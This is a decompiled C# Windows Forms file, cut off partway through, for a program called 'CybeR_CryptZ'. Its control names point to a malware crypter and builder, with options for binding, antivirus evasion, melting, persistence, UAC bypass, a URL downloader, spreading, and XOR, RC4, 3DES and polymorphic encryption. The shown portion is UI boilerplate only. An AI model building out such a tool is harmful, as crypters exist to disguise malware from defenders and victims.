using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using CybeR_CryptZ.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace CybeR_CryptZ
{

    [DesignerGenerated]
    public class U_S_G : Form
    {

        [AccessedThroughProperty("BinderButton")]
        private RButton _BinderButton;
        [AccessedThroughProperty("BinderCheck")]
        private CheckBox _BinderCheck;
        [AccessedThroughProperty("Check3DES")]
        private RadioButton _Check3DES;
        [AccessedThroughProperty("CheckAntis")]
        private CheckBox _CheckAntis;
        [AccessedThroughProperty("CheckBox1")]
        private CheckBox _CheckBox1;
        [AccessedThroughProperty("CheckBox10")]
        private CheckBox _CheckBox10;
        [AccessedThroughProperty("CheckBox12")]
        private CheckBox _CheckBox12;
        [AccessedThroughProperty("CheckBox13")]
        private CheckBox _CheckBox13;
        [AccessedThroughProperty("CheckBox14")]
        private CheckBox _CheckBox14;
        [AccessedThroughProperty("CheckBox15")]
        private CheckBox _CheckBox15;
        [AccessedThroughProperty("CheckBox16")]
        private CheckBox _CheckBox16;
        [AccessedThroughProperty("CheckBox17")]
        private CheckBox _CheckBox17;
        [AccessedThroughProperty("CheckBox18")]
        private CheckBox _CheckBox18;
        [AccessedThroughProperty("CheckBox2")]
        private CheckBox _CheckBox2;
        [AccessedThroughProperty("CheckBox3")]
        private CheckBox _CheckBox3;
        [AccessedThroughProperty("CheckBox4")]
        private CheckBox _CheckBox4;
        [AccessedThroughProperty("CheckBox5")]
        private CheckBox _CheckBox5;
        [AccessedThroughProperty("CheckBox6")]
        private CheckBox _CheckBox6;
        [AccessedThroughProperty("CheckBox7")]
        private CheckBox _CheckBox7;
        [AccessedThroughProperty("CheckBox9")]
        private CheckBox _CheckBox9;
        [AccessedThroughProperty("CheckMelt")]
        private CheckBox _CheckMelt;
        [AccessedThroughProperty("CheckXOR")]
        private RadioButton _CheckXOR;
        [AccessedThroughProperty("crypterstartup")]
        private RadioButton _crypterstartup;
        [AccessedThroughProperty("CypherxGroupBox2")]
        private CypherxGroupBox _CypherxGroupBox2;
        [AccessedThroughProperty("CypherxGroupBox4")]
        private CypherxGroupBox _CypherxGroupBox4;
        [AccessedThroughProperty("CypherxGroupBox5")]
        private CypherxGroupBox _CypherxGroupBox5;
        [AccessedThroughProperty("CypherxGroupBox7")]
        private CypherxGroupBox _CypherxGroupBox7;
        [AccessedThroughProperty("CypherxGroupBox9")]
        private CypherxGroupBox _CypherxGroupBox9;
        [AccessedThroughProperty("DisableHide")]
        private CheckBox _DisableHide;
        [AccessedThroughProperty("DisableTask")]
        private CheckBox _DisableTask;
        [AccessedThroughProperty("Down_ExCheck")]
        private CheckBox _Down_ExCheck;
        [AccessedThroughProperty("fusersGroupBox")]
        private CypherxGroupBox _fusersGroupBox;
        [AccessedThroughProperty("GroupBox1")]
        private CypherxGroupBox _GroupBox1;
        [AccessedThroughProperty("GroupBox10")]
        private CypherxGroupBox _GroupBox10;
        [AccessedThroughProperty("GroupBox11")]
        private CypherxGroupBox _GroupBox11;
        [AccessedThroughProperty("GroupBox2")]
        private GroupBox _GroupBox2;
        [AccessedThroughProperty("GroupBox3")]
        private CypherxGroupBox _GroupBox3;
        [AccessedThroughProperty("GroupBox5")]
        private CypherxGroupBox _GroupBox5;
        [AccessedThroughProperty("GroupBox6")]
        private CypherxGroupBox _GroupBox6;
        [AccessedThroughProperty("GroupBox9")]
        private CypherxGroupBox _GroupBox9;
        [AccessedThroughProperty("IconPicBoxChanged")]
        private PictureBox _IconPicBoxChanged;
        [AccessedThroughProperty("Label1")]
        private Label _Label1;
        [AccessedThroughProperty("Label18regname")]
        private Label _Label18regname;
        [AccessedThroughProperty("Label19fname")]
        private Label _Label19fname;
        [AccessedThroughProperty("Label2")]
        private Label _Label2;
        [AccessedThroughProperty("Label3")]
        private Label _Label3;
        [AccessedThroughProperty("Label3comp")]
        private Label _Label3comp;
        [AccessedThroughProperty("Label4")]
        private Label _Label4;
        [AccessedThroughProperty("Label4Description")]
        private Label _Label4Description;
        [AccessedThroughProperty("Label6ver")]
        private Label _Label6ver;
        [AccessedThroughProperty("Label79")]
        private Label _Label79;
        [AccessedThroughProperty("Label7copy")]
        private Label _Label7copy;
        [AccessedThroughProperty("Label80")]
        private Label _Label80;
        [AccessedThroughProperty("Label8fverr")]
        private Label _Label8fverr;
        [AccessedThroughProperty("Label9prod")]
        private Label _Label9prod;
        [AccessedThroughProperty("MiscGroupBox")]
        private CypherxGroupBox _MiscGroupBox;
        [AccessedThroughProperty("MsgBoxTest")]
        private RButton _MsgBoxTest;
        [AccessedThroughProperty("NumericUpDown1")]
        private NumericUpDown _NumericUpDown1;
        [AccessedThroughProperty("NumericUpDown10")]
        private NumericUpDown _NumericUpDown10;
        [AccessedThroughProperty("NumericUpDown2")]
        private NumericUpDown _NumericUpDown2;
        [AccessedThroughProperty("NumericUpDown3")]
        private NumericUpDown _NumericUpDown3;
        [AccessedThroughProperty("NumericUpDown4")]
        private NumericUpDown _NumericUpDown4;
        [AccessedThroughProperty("NumericUpDown5")]
        private NumericUpDown _NumericUpDown5;
        [AccessedThroughProperty("NumericUpDown6")]
        private NumericUpDown _NumericUpDown6;
        [AccessedThroughProperty("NumericUpDown7")]
        private NumericUpDown _NumericUpDown7;
        [AccessedThroughProperty("NumericUpDown8")]
        private NumericUpDown _NumericUpDown8;
        [AccessedThroughProperty("NumericUpDown9")]
        private NumericUpDown _NumericUpDown9;
        [AccessedThroughProperty("PersistenceCheck")]
        private CheckBox _PersistenceCheck;
        [AccessedThroughProperty("PictureBox1")]
        private PictureBox _PictureBox1;
        [AccessedThroughProperty("PolyCloud")]
        private RadioButton _PolyCloud;
        [AccessedThroughProperty("PolyCryptEncryption")]
        private RadioButton _PolyCryptEncryption;
        [AccessedThroughProperty("PolyStairs")]
        private RadioButton _PolyStairs;
        [AccessedThroughProperty("POlyXORV2")]
        private RadioButton _POlyXORV2;
        [AccessedThroughProperty("RadioButton1")]
        private RadioButton _RadioButton1;
        [AccessedThroughProperty("RadioButton10")]
        private RadioButton _RadioButton10;
        [AccessedThroughProperty("RadioButton11")]
        private RadioButton _RadioButton11;
        [AccessedThroughProperty("RadioButton12")]
        private RadioButton _RadioButton12;
        [AccessedThroughProperty("RadioButton13")]
        private RadioButton _RadioButton13;
        [AccessedThroughProperty("RadioButton14")]
        private RadioButton _RadioButton14;
        [AccessedThroughProperty("RadioButton15")]
        private RadioButton _RadioButton15;
        [AccessedThroughProperty("RadioButton16")]
        private RadioButton _RadioButton16;
        [AccessedThroughProperty("RadioButton17")]
        private RadioButton _RadioButton17;
        [AccessedThroughProperty("RadioButton18")]
        private RadioButton _RadioButton18;
        [AccessedThroughProperty("RadioButton19")]
        private RadioButton _RadioButton19;
        [AccessedThroughProperty("RadioButton2")]
        private RadioButton _RadioButton2;
        [AccessedThroughProperty("RadioButton20")]
        private RadioButton _RadioButton20;
        [AccessedThroughProperty("RadioButton21")]
        private RadioButton _RadioButton21;
        [AccessedThroughProperty("RadioButton22")]
        private RadioButton _RadioButton22;
        [AccessedThroughProperty("RadioButton23")]
        private RadioButton _RadioButton23;
        [AccessedThroughProperty("RadioButton24")]
        private RadioButton _RadioButton24;
        [AccessedThroughProperty("RadioButton25")]
        private RadioButton _RadioButton25;
        [AccessedThroughProperty("RadioButton3")]
        private RadioButton _RadioButton3;
        [AccessedThroughProperty("RadioButton4")]
        private RadioButton _RadioButton4;
        [AccessedThroughProperty("RadioButton5")]
        private RadioButton _RadioButton5;
        [AccessedThroughProperty("RadioButton6")]
        private RadioButton _RadioButton6;
        [AccessedThroughProperty("RadioButton7")]
        private RadioButton _RadioButton7;
        [AccessedThroughProperty("RadioButton8")]
        private RadioButton _RadioButton8;
        [AccessedThroughProperty("RadioButton9")]
        private RadioButton _RadioButton9;
        [AccessedThroughProperty("RButton1")]
        private RButton _RButton1;
        [AccessedThroughProperty("RButton2")]
        private RButton _RButton2;
        [AccessedThroughProperty("RButton21")]
        private RButton _RButton21;
        [AccessedThroughProperty("RButton22")]
        private RButton _RButton22;
        [AccessedThroughProperty("RButton23")]
        private RButton _RButton23;
        [AccessedThroughProperty("RButton24")]
        private RButton _RButton24;
        [AccessedThroughProperty("RButton25")]
        private RButton _RButton25;
        [AccessedThroughProperty("RButton28")]
        private RButton _RButton28;
        [AccessedThroughProperty("RButton3")]
        private RButton _RButton3;
        [AccessedThroughProperty("RButton4")]
        private RButton _RButton4;
        [AccessedThroughProperty("RButton5")]
        private RButton _RButton5;
        [AccessedThroughProperty("RButton6")]
        private RButton _RButton6;
        [AccessedThroughProperty("RC4")]
        private RadioButton _RC4;
        [AccessedThroughProperty("Rotator1")]
        private Rotator _Rotator1;
        [AccessedThroughProperty("RTheme1")]
        private RTheme _RTheme1;
        [AccessedThroughProperty("Seperator5")]
        private Seperator _Seperator5;
        [AccessedThroughProperty("ServerStartup")]
        private RadioButton _ServerStartup;
        [AccessedThroughProperty("SpreadingGroupBox")]
        private CypherxGroupBox _SpreadingGroupBox;
        [AccessedThroughProperty("Stairs")]
        private RadioButton _Stairs;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        [AccessedThroughProperty("TextBox11")]
        private TextBox _TextBox11;
        [AccessedThroughProperty("TextBox12")]
        private TextBox _TextBox12;
        [AccessedThroughProperty("TextBox16")]
        private TextBox _TextBox16;
        [AccessedThroughProperty("TextBox17")]
        private TextBox _TextBox17;
        [AccessedThroughProperty("TextBox2")]
        private TextBox _TextBox2;
        [AccessedThroughProperty("TextBox3")]
        private TextBox _TextBox3;
        [AccessedThroughProperty("TextBox4")]
        private TextBox _TextBox4;
        [AccessedThroughProperty("TextBox5")]
        private TextBox _TextBox5;
        [AccessedThroughProperty("TextBox7")]
        private TextBox _TextBox7;
        [AccessedThroughProperty("TextBox8")]
        private TextBox _TextBox8;
        [AccessedThroughProperty("TextBox9")]
        private TextBox _TextBox9;
        [AccessedThroughProperty("TitleLabl")]
        private Label _TitleLabl;
        [AccessedThroughProperty("TripleDEES")]
        private RadioButton _TripleDEES;
        [AccessedThroughProperty("UACheck")]
        private CheckBox _UACheck;
        [AccessedThroughProperty("Url_Downloader_Text")]
        private TextBox _Url_Downloader_Text;
        private IContainer components;

        private static List<WeakReference> __ENCList;
        public static object Buttona;
        public static object Icona;
        public static OpenFileDialog openbind;
        public static OpenFileDialog openclone;

        internal virtual RButton BinderButton
        {
            get
            {
                return _BinderButton;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(BinderButton_Click);
                bool flag = _BinderButton != null;
                if (flag)
                    _BinderButton.Click -= eventHandler;
                _BinderButton = value;
                flag = _BinderButton != null;
                if (flag)
                    _BinderButton.Click += eventHandler;
            }
        }

        internal virtual CheckBox BinderCheck
        {
            get
            {
                return _BinderCheck;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(CheckBox8_CheckedChanged);
                bool flag = _BinderCheck != null;
                if (flag)
                    _BinderCheck.CheckedChanged -= eventHandler;
                _BinderCheck = value;
                flag = _BinderCheck != null;
                if (flag)
                    _BinderCheck.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton Check3DES
        {
            get
            {
                return _Check3DES;
            }
            set
            {
                _Check3DES = value;
            }
        }

        internal virtual CheckBox CheckAntis
        {
            get
            {
                return _CheckAntis;
            }
            set
            {
                _CheckAntis = value;
            }
        }

        internal virtual CheckBox CheckBox1
        {
            get
            {
                return _CheckBox1;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(CheckBox1_CheckedChanged);
                bool flag = _CheckBox1 != null;
                if (flag)
                    _CheckBox1.CheckedChanged -= eventHandler;
                _CheckBox1 = value;
                flag = _CheckBox1 != null;
                if (flag)
                    _CheckBox1.CheckedChanged += eventHandler;
            }
        }

        internal virtual CheckBox CheckBox10
        {
            get
            {
                return _CheckBox10;
            }
            set
            {
                _CheckBox10 = value;
            }
        }

        internal virtual CheckBox CheckBox12
        {
            get
            {
                return _CheckBox12;
            }
            set
            {
                _CheckBox12 = value;
            }
        }

        internal virtual CheckBox CheckBox13
        {
            get
            {
                return _CheckBox13;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(CheckBox13_CheckedChanged);
                bool flag = _CheckBox13 != null;
                if (flag)
                    _CheckBox13.CheckedChanged -= eventHandler;
                _CheckBox13 = value;
                flag = _CheckBox13 != null;
                if (flag)
                    _CheckBox13.CheckedChanged += eventHandler;
            }
        }

        internal virtual CheckBox CheckBox14
        {
            get
            {
                return _CheckBox14;
            }
            set
            {
                _CheckBox14 = value;
            }
        }

        internal virtual CheckBox CheckBox15
        {
            get
            {
                return _CheckBox15;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(CheckBox15_CheckedChanged);
                bool flag = _CheckBox15 != null;
                if (flag)
                    _CheckBox15.CheckedChanged -= eventHandler;
                _CheckBox15 = value;
                flag = _CheckBox15 != null;
                if (flag)
                    _CheckBox15.CheckedChanged += eventHandler;
            }
        }

        internal virtual CheckBox CheckBox16
        {
            get
            {
                return _CheckBox16;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(CheckBox16_CheckedChanged);
                bool flag = _CheckBox16 != null;
                if (flag)
                    _CheckBox16.CheckedChanged -= eventHandler;
                _CheckBox16 = value;
                flag = _CheckBox16 != null;
                if (flag)
                    _CheckBox16.CheckedChanged += eventHandler;
            }
        }

        internal virtual CheckBox CheckBox17
        {
            get
            {
                return _CheckBox17;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(CheckBox17_CheckedChanged);
                bool flag = _CheckBox17 != null;
                if (flag)
                    _CheckBox17.CheckedChanged -= eventHandler;
                _CheckBox17 = value;
                flag = _CheckBox17 != null;
                if (flag)
                    _CheckBox17.CheckedChanged += eventHandler;
            }
        }

        internal virtual CheckBox CheckBox18
        {
            get
            {
                return _CheckBox18;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(CheckBox18_CheckedChanged);
                bool flag = _CheckBox18 != null;
                if (flag)
                    _CheckBox18.CheckedChanged -= eventHandler;
                _CheckBox18 = value;
                flag = _CheckBox18 != null;
                if (flag)
                    _CheckBox18.CheckedChanged += eventHandler;
            }
        }

        internal virtual CheckBox CheckBox2
        {
            get
            {
                return _CheckBox2;
            }
            set
            {
                _CheckBox2 = value;
            }
        }

        internal virtual CheckBox CheckBox3
        {
            get
            {
                return _CheckBox3;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(CheckBox3_CheckedChanged);
                bool flag = _CheckBox3 != null;
                if (flag)
                    _CheckBox3.CheckedChanged -= eventHandler;
                _CheckBox3 = value;
                flag = _CheckBox3 != null;
                if (flag)
                    _CheckBox3.CheckedChanged += eventHandler;
            }
        }

        internal virtual CheckBox CheckBox4
        {
            get
            {
                return _CheckBox4;
            }
            set
            {
                _CheckBox4 = value;
            }
        }

        internal virtual CheckBox CheckBox5
        {
            get
            {
                return _CheckBox5;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(CheckBox5_CheckedChanged);
                bool flag = _CheckBox5 != null;
                if (flag)
                    _CheckBox5.CheckedChanged -= eventHandler;
                _CheckBox5 = value;
                flag = _CheckBox5 != null;
                if (flag)
                    _CheckBox5.CheckedChanged += eventHandler;
            }
        }

        internal virtual CheckBox CheckBox6
        {
            get
            {
                return _CheckBox6;
            }
            set
            {
                _CheckBox6 = value;
            }
        }

        internal virtual CheckBox CheckBox7
        {
            get
            {
                return _CheckBox7;
            }
            set
            {
                _CheckBox7 = value;
            }
        }

        internal virtual CheckBox CheckBox9
        {
            get
            {
                return _CheckBox9;
            }
            set
            {
                _CheckBox9 = value;
            }
        }

        internal virtual CheckBox CheckMelt
        {
            get
            {
                return _CheckMelt;
            }
            set
            {
                _CheckMelt = value;
            }
        }

        internal virtual RadioButton CheckXOR
        {
            get
            {
                return _CheckXOR;
            }
            set
            {
                _CheckXOR = value;
            }
        }

        internal virtual RadioButton crypterstartup
        {
            get
            {
                return _crypterstartup;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(crypterstartup_CheckedChanged);
                bool flag = _crypterstartup != null;
                if (flag)
                    _crypterstartup.CheckedChanged -= eventHandler;
                _crypterstartup = value;
                flag = _crypterstartup != null;
                if (flag)
                    _crypterstartup.CheckedChanged += eventHandler;
            }
        }

        internal virtual CypherxGroupBox CypherxGroupBox2
        {
            get
            {
                return _CypherxGroupBox2;
            }
            set
            {
                _CypherxGroupBox2 = value;
            }
        }

        internal virtual CypherxGroupBox CypherxGroupBox4
        {
            get
            {
                return _CypherxGroupBox4;
            }
            set
            {
                _CypherxGroupBox4 = value;
            }
        }

        internal virtual CypherxGroupBox CypherxGroupBox5
        {
            get
            {
                return _CypherxGroupBox5;
            }
            set
            {
                _CypherxGroupBox5 = value;
            }
        }

        internal virtual CypherxGroupBox CypherxGroupBox7
        {
            get
            {
                return _CypherxGroupBox7;
            }
            set
            {
                _CypherxGroupBox7 = value;
            }
        }

        internal virtual CypherxGroupBox CypherxGroupBox9
        {
            get
            {
                return _CypherxGroupBox9;
            }
            set
            {
                _CypherxGroupBox9 = value;
            }
        }

        internal virtual CheckBox DisableHide
        {
            get
            {
                return _DisableHide;
            }
            set
            {
                _DisableHide = value;
            }
        }

        internal virtual CheckBox DisableTask
        {
            get
            {
                return _DisableTask;
            }
            set
            {
                _DisableTask = value;
            }
        }

        internal virtual CheckBox Down_ExCheck
        {
            get
            {
                return _Down_ExCheck;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(Down_ExCheck_CheckedChanged);
                bool flag = _Down_ExCheck != null;
                if (flag)
                    _Down_ExCheck.CheckedChanged -= eventHandler;
                _Down_ExCheck = value;
                flag = _Down_ExCheck != null;
                if (flag)
                    _Down_ExCheck.CheckedChanged += eventHandler;
            }
        }

        internal virtual CypherxGroupBox fusersGroupBox
        {
            get
            {
                return _fusersGroupBox;
            }
            set
            {
                _fusersGroupBox = value;
            }
        }

        internal virtual CypherxGroupBox GroupBox1
        {
            get
            {
                return _GroupBox1;
            }
            set
            {
                _GroupBox1 = value;
            }
        }

        internal virtual CypherxGroupBox GroupBox10
        {
            get
            {
                return _GroupBox10;
            }
            set
            {
                _GroupBox10 = value;
            }
        }

        internal virtual CypherxGroupBox GroupBox11
        {
            get
            {
                return _GroupBox11;
            }
            set
            {
                _GroupBox11 = value;
            }
        }

        internal virtual GroupBox GroupBox2
        {
            get
            {
                return _GroupBox2;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(GroupBox2_Click);
                bool flag = _GroupBox2 != null;
                if (flag)
                    _GroupBox2.Click -= eventHandler;
                _GroupBox2 = value;
                flag = _GroupBox2 != null;
                if (flag)
                    _GroupBox2.Click += eventHandler;
            }
        }

        internal virtual CypherxGroupBox GroupBox3
        {
            get
            {
                return _GroupBox3;
            }
            set
            {
                _GroupBox3 = value;
            }
        }

        internal virtual CypherxGroupBox GroupBox5
        {
            get
            {
                return _GroupBox5;
            }
            set
            {
                _GroupBox5 = value;
            }
        }

        internal virtual CypherxGroupBox GroupBox6
        {
            get
            {
                return _GroupBox6;
            }
            set
            {
                _GroupBox6 = value;
            }
        }

        internal virtual CypherxGroupBox GroupBox9
        {
            get
            {
                return _GroupBox9;
            }
            set
            {
                _GroupBox9 = value;
            }
        }

        internal virtual PictureBox IconPicBoxChanged
        {
            get
            {
                return _IconPicBoxChanged;
            }
            set
            {
                _IconPicBoxChanged = value;
            }
        }

        internal virtual Label Label1
        {
            get
            {
                return _Label1;
            }
            set
            {
                _Label1 = value;
            }
        }

        internal virtual Label Label18regname
        {
            get
            {
                return _Label18regname;
            }
            set
            {
                _Label18regname = value;
            }
        }

        internal virtual Label Label19fname
        {
            get
            {
                return _Label19fname;
            }
            set
            {
                _Label19fname = value;
            }
        }

        internal virtual Label Label2
        {
            get
            {
                return _Label2;
            }
            set
            {
                _Label2 = value;
            }
        }

        internal virtual Label Label3
        {
            get
            {
                return _Label3;
            }
            set
            {
                _Label3 = value;
            }
        }

        internal virtual Label Label3comp
        {
            get
            {
                return _Label3comp;
            }
            set
            {
                _Label3comp = value;
            }
        }

        internal virtual Label Label4
        {
            get
            {
                return _Label4;
            }
            set
            {
                _Label4 = value;
            }
        }

        internal virtual Label Label4Description
        {
            get
            {
                return _Label4Description;
            }
            set
            {
                _Label4Description = value;
            }
        }

        internal virtual Label Label6ver
        {
            get
            {
                return _Label6ver;
            }
            set
            {
                _Label6ver = value;
            }
        }

        internal virtual Label Label79
        {
            get
            {
                return _Label79;
            }
            set
            {
                _Label79 = value;
            }
        }

        internal virtual Label Label7copy
        {
            get
            {
                return _Label7copy;
            }
            set
            {
                _Label7copy = value;
            }
        }

        internal virtual Label Label80
        {
            get
            {
                return _Label80;
            }
            set
            {
                _Label80 = value;
            }
        }

        internal virtual Label Label8fverr
        {
            get
            {
                return _Label8fverr;
            }
            set
            {
                _Label8fverr = value;
            }
        }

        internal virtual Label Label9prod
        {
            get
            {
                return _Label9prod;
            }
            set
            {
                _Label9prod = value;
            }
        }

        internal virtual CypherxGroupBox MiscGroupBox
        {
            get
            {
                return _MiscGroupBox;
            }
            set
            {
                _MiscGroupBox = value;
            }
        }

        internal virtual RButton MsgBoxTest
        {
            get
            {
                return _MsgBoxTest;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(MsgBoxTest_Click);
                bool flag = _MsgBoxTest != null;
                if (flag)
                    _MsgBoxTest.Click -= eventHandler;
                _MsgBoxTest = value;
                flag = _MsgBoxTest != null;
                if (flag)
                    _MsgBoxTest.Click += eventHandler;
            }
        }

        internal virtual NumericUpDown NumericUpDown1
        {
            get
            {
                return _NumericUpDown1;
            }
            set
            {
                _NumericUpDown1 = value;
            }
        }

        internal virtual NumericUpDown NumericUpDown10
        {
            get
            {
                return _NumericUpDown10;
            }
            set
            {
                _NumericUpDown10 = value;
            }
        }

        internal virtual NumericUpDown NumericUpDown2
        {
            get
            {
                return _NumericUpDown2;
            }
            set
            {
                _NumericUpDown2 = value;
            }
        }

        internal virtual NumericUpDown NumericUpDown3
        {
            get
            {
                return _NumericUpDown3;
            }
            set
            {
                _NumericUpDown3 = value;
            }
        }

        internal virtual NumericUpDown NumericUpDown4
        {
            get
            {
                return _NumericUpDown4;
            }
            set
            {
                _NumericUpDown4 = value;
            }
        }

        internal virtual NumericUpDown NumericUpDown5
        {
            get
            {
                return _NumericUpDown5;
            }
            set
            {
                _NumericUpDown5 = value;
            }
        }

        internal virtual NumericUpDown NumericUpDown6
        {
            get
            {
                return _NumericUpDown6;
            }
            set
            {
                _NumericUpDown6 = value;
            }
        }

        internal virtual NumericUpDown NumericUpDown7
        {
            get
            {
                return _NumericUpDown7;
            }
            set
            {
                _NumericUpDown7 = value;
            }
        }

        internal virtual NumericUpDown NumericUpDown8
        {
            get
            {
                return _NumericUpDown8;
            }
            set
            {
                _NumericUpDown8 = value;
            }
        }

        internal virtual NumericUpDown NumericUpDown9
        {
            get
            {
                return _NumericUpDown9;
            }
            set
            {
                _NumericUpDown9 = value;
            }
        }

        internal virtual CheckBox PersistenceCheck
        {
            get
            {
                return _PersistenceCheck;
            }
            set
            {
                _PersistenceCheck = value;
            }
        }

        internal virtual PictureBox PictureBox1
        {
            get
            {
                return _PictureBox1;
            }
            set
            {
                _PictureBox1 = value;
            }
        }

        internal virtual RadioButton PolyCloud
        {
            get
            {
                return _PolyCloud;
            }
            set
            {
                _PolyCloud = value;
            }
        }

        internal virtual RadioButton PolyCryptEncryption
        {
            get
            {
                return _PolyCryptEncryption;
            }
            set
            {
                _PolyCryptEncryption = value;
            }
        }

        internal virtual RadioButton PolyStairs
        {
            get
            {
                return _PolyStairs;
            }
            set
            {
                _PolyStairs = value;
            }
        }

        internal virtual RadioButton POlyXORV2
        {
            get
            {
                return _POlyXORV2;
            }
            set
            {
                _POlyXORV2 = value;
            }
        }

        internal virtual RadioButton RadioButton1
        {
            get
            {
                return _RadioButton1;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton1_CheckedChanged);
                bool flag = _RadioButton1 != null;
                if (flag)
                    _RadioButton1.CheckedChanged -= eventHandler;
                _RadioButton1 = value;
                flag = _RadioButton1 != null;
                if (flag)
                    _RadioButton1.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton10
        {
            get
            {
                return _RadioButton10;
            }
            set
            {
                _RadioButton10 = value;
            }
        }

        internal virtual RadioButton RadioButton11
        {
            get
            {
                return _RadioButton11;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton11_CheckedChanged);
                bool flag = _RadioButton11 != null;
                if (flag)
                    _RadioButton11.CheckedChanged -= eventHandler;
                _RadioButton11 = value;
                flag = _RadioButton11 != null;
                if (flag)
                    _RadioButton11.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton12
        {
            get
            {
                return _RadioButton12;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton12_CheckedChanged);
                bool flag = _RadioButton12 != null;
                if (flag)
                    _RadioButton12.CheckedChanged -= eventHandler;
                _RadioButton12 = value;
                flag = _RadioButton12 != null;
                if (flag)
                    _RadioButton12.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton13
        {
            get
            {
                return _RadioButton13;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton13_CheckedChanged);
                bool flag = _RadioButton13 != null;
                if (flag)
                    _RadioButton13.CheckedChanged -= eventHandler;
                _RadioButton13 = value;
                flag = _RadioButton13 != null;
                if (flag)
                    _RadioButton13.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton14
        {
            get
            {
                return _RadioButton14;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton14_CheckedChanged);
                bool flag = _RadioButton14 != null;
                if (flag)
                    _RadioButton14.CheckedChanged -= eventHandler;
                _RadioButton14 = value;
                flag = _RadioButton14 != null;
                if (flag)
                    _RadioButton14.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton15
        {
            get
            {
                return _RadioButton15;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton15_CheckedChanged);
                bool flag = _RadioButton15 != null;
                if (flag)
                    _RadioButton15.CheckedChanged -= eventHandler;
                _RadioButton15 = value;
                flag = _RadioButton15 != null;
                if (flag)
                    _RadioButton15.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton16
        {
            get
            {
                return _RadioButton16;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton16_CheckedChanged);
                bool flag = _RadioButton16 != null;
                if (flag)
                    _RadioButton16.CheckedChanged -= eventHandler;
                _RadioButton16 = value;
                flag = _RadioButton16 != null;
                if (flag)
                    _RadioButton16.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton17
        {
            get
            {
                return _RadioButton17;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton17_CheckedChanged);
                bool flag = _RadioButton17 != null;
                if (flag)
                    _RadioButton17.CheckedChanged -= eventHandler;
                _RadioButton17 = value;
                flag = _RadioButton17 != null;
                if (flag)
                    _RadioButton17.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton18
        {
            get
            {
                return _RadioButton18;
            }
            set
            {
                _RadioButton18 = value;
            }
        }

        internal virtual RadioButton RadioButton19
        {
            get
            {
                return _RadioButton19;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton19_CheckedChanged);
                bool flag = _RadioButton19 != null;
                if (flag)
                    _RadioButton19.CheckedChanged -= eventHandler;
                _RadioButton19 = value;
                flag = _RadioButton19 != null;
                if (flag)
                    _RadioButton19.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton2
        {
            get
            {
                return _RadioButton2;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton2_CheckedChanged);
                bool flag = _RadioButton2 != null;
                if (flag)
                    _RadioButton2.CheckedChanged -= eventHandler;
                _RadioButton2 = value;
                flag = _RadioButton2 != null;
                if (flag)
                    _RadioButton2.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton20
        {
            get
            {
                return _RadioButton20;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton20_CheckedChanged);
                bool flag = _RadioButton20 != null;
                if (flag)
                    _RadioButton20.CheckedChanged -= eventHandler;
                _RadioButton20 = value;
                flag = _RadioButton20 != null;
                if (flag)
                    _RadioButton20.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton21
        {
            get
            {
                return _RadioButton21;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton21_CheckedChanged);
                bool flag = _RadioButton21 != null;
                if (flag)
                    _RadioButton21.CheckedChanged -= eventHandler;
                _RadioButton21 = value;
                flag = _RadioButton21 != null;
                if (flag)
                    _RadioButton21.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton22
        {
            get
            {
                return _RadioButton22;
            }
            set
            {
                _RadioButton22 = value;
            }
        }

        internal virtual RadioButton RadioButton23
        {
            get
            {
                return _RadioButton23;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RadioButton23_CheckedChanged);
                bool flag = _RadioButton23 != null;
                if (flag)
                    _RadioButton23.CheckedChanged -= eventHandler;
                _RadioButton23 = value;
                flag = _RadioButton23 != null;
                if (flag)
                    _RadioButton23.CheckedChanged += eventHandler;
            }
        }

        internal virtual RadioButton RadioButton24
        {
            get
            {
                return _RadioButton24;
            }
            set
            {
                _RadioButton24 = value;
            }
        }

        internal virtual RadioButton RadioButton25
        {
            get
            {
                return _RadioButton25;
            }
            set
            {
                _RadioButton25 = value;
            }
        }

        internal virtual RadioButton RadioButton3
        {
            get
            {
